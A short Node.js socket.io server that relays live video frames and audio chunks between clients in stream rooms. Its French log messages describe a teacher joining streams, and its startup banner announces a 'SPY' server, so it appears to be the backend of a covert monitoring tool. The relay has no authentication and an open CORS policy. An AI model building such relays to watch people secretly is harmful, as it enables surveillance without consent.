const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static('public'));
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'viewer.html')));

const streams = new Map();

io.on('connection', (socket) => {
  console.log('✅ Connexion:', socket.id);
  
  socket.on('join-stream', (streamId) => {
    socket.join(streamId);
    console.log(`👁️ Professeur connecté au stream: ${streamId}`);
  });
  
  socket.on('video-frame', (data) => {
    const { streamId, frame } = data;
    socket.to(streamId).emit('video-frame', frame);
  });
  
  socket.on('audio-chunk', (data) => {
    const { streamId, chunk } = data;
    socket.to(streamId).emit('audio-chunk', chunk);
  });
  
  socket.on('disconnect', () => {
    console.log('❌ Déconnexion:', socket.id);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🔴 SERVEUR SPY ACTIF: https://votre-app.onrender.com`);
});
